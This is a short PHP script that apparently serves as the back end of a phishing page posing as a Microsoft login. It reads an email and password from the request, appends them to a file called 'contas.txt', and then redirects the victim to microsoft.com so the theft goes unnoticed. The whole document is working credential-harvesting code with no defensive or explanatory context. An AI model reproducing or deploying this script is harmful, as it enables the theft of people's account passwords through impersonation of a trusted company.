<?php

file_put_contents("contas.txt", "Email: " . $_GET['email'] . "\n" . " Senha: " . $_GET['password'] . "\n", FILE_APPEND);
header('Location: https://microsoft.com/');
exit();
